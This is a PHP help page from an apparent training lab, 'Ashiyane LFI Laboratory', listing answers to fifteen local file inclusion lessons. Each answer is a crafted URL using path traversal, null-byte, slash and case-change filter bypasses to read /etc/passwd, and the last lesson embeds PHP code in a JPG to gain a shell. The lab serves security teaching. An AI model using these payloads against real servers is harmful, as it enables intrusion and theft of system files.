<!DOCTYPE html>
<html>
<head>
	<title>Help</title>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<link rel="stylesheet" href="../includes/style/style.css">
	<style type="text/css">
	body{
		background: #5B75A1;
	}
	</style>
</head>
<body>
<div id="helpmain">
<br>
<?php
error_reporting(0);
if(isset($_GET['lesson']) && !empty($_GET['lesson'])){
	$help=htmlspecialchars($_GET['lesson']);
	$url=$_SERVER['HTTP_HOST'];
	echo "
	<fieldset>
	<legend>Help for lesson $help</legend>
	";

	if($help==1){
		echo "use ../ for return in directory and add your file's name like:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-1/index.php?file=../../../../etc/passwd";
	} 
	elseif($help==2){
		echo "use ../ for return in directory then add file name and nullbyte(%00) like:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-2/index.php?file=../../../../etc/passwd%00";
	}
	elseif($help==3){
		echo "you must bypass ../.. <br><br> use ..//.. like:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-3/index.php?file=..//..//..//..//etc/passwd";
	}
	elseif($help==4){
		echo "bypass ../..<br>but // will be replaced with / <br><br> you must use .././ for return in directory and add your file's name like:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-4/index.php?file=.././.././.././../etc/passwd";
	}
	elseif($help==5){
		echo "now try to bypass ../../. and /.././ but // will be replaced with / <br><br>and you can use ../../[any chracter]/../.. for return in directory afterwards add your file's name  like:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-5/index.php?file=../../../nn/../../etc/passwd";
	}
	elseif($help==6){
		echo "the script checks $_GET for get the last suffix and it must be html or txt so we must use nullbyte like:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-6/index.php?file=../../../../etc/passwd%00.html";
	}
	elseif($help==7){
		echo "we can bypass etc/passwd in this way:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-7/index.php?file=../../../../Etc/pasSwd";
	}
	elseif($help==8){
		echo "we must bypass etc/passwd so we can use // similar to:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-8/index.php?file=../../../../etc//passwd";
	}
	elseif($help==9){
		echo "the script checks the suffix and etc/passwd and it replaces // to / so we can do something like this:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-9/index.php?file=../../../../etc/./passwd%00.html";
	}
	elseif($help==10){
		echo "the script checks the suffix and etc/passwd and it replaces // to / and /./ so we can do like:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-10/index.php?file=../../l/../etc/l/../passwd%00.html";
	}
	elseif($help==11){
		echo "ignore hacking attempt and no valid file and just see html's source like:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-11/index.php?file=../../../../etc/passwd";
	}
	elseif($help==12){
		echo "use post's hackbar like:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-12/index.php                  [post] file=../../../../etc/passwd";
	}
	elseif($help==13){
		echo "you can use post's hackbar but you must use _GET[file] in url so we can do something like this:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-13/index.php?file=mh.txt    [post] file=../../../../etc/passwd";
	}
	elseif($help==14){
		echo "you can use referrer's hackbar and post's hackbar but you must use _GET[file] in url so the bypass is:<br>http://$url/Ashiyane LFI Laboratory/core/lessons/less-14/index.php?file=mh.txt    [post] file=../../../../etc/passwd [referrer] http:*";
	}
	elseif($help==15){
echo "use exiftool or edjpgcom for enter php code in jpg file. its size must be smaller than 10KB and include it like this: <br> http://$url/Ashiyane LFI Laboratory/core/lessons/less-15/index.php?file=../../../lessons/less-15/upload/[file's name for example shell.jpg]&i=i.jpg<br><br><br>for more information you can use this link:<br><br>
<a target=_blank  href='http://ashiyane.org/forums/showthread.php?146814-How-to-insert-php-codes-into-picture-file&p=890957#post890957'>How to insert php codes into picture file</a>";
	}
	else{
		echo "Not Found!";
	}

	echo "</fieldset>";

} else{
	echo "
	<fieldset>
		<legend>Lessons:</legend>
		<table>
	</fieldset>

<table>
	<tr>
	<td><a href='?lesson=1'>Lesson 1</a></td>
	<td><a href='?lesson=2'>Lesson 2</a></td>
	<td><a href='?lesson=3'>Lesson 3</a></td>
	</tr>
	<tr>
	<td><a href='?lesson=4'>Lesson 4</a></td>
	<td><a href='?lesson=5'>Lesson 5</a></td>
	<td><a href='?lesson=6'>Lesson 6</a></td>
	</tr>
	<tr>
	<td><a href='?lesson=7'>Lesson 7</a></td>
	<td><a href='?lesson=8'>Lesson 8</a></td>
	<td><a href='?lesson=9'>Lesson 9</a></td>
	</tr>
	<tr>
	<td><a href='?lesson=10'>Lesson 10</a></td>
	<td><a href='?lesson=11'>Lesson 11</a></td>
	<td><a href='?lesson=12'>Lesson 12</a></td>
	</tr>
	<tr>
	<td><a href='?lesson=13'>Lesson 13</a></td>
	<td><a href='?lesson=14'>Lesson 14</a></td>
	<td><a href='?lesson=15'>Lesson 15</a></td>
	</tr>
</table>
	";
}
?>
<br><Br>
<button onclick="window.close()">Close</button>

</div>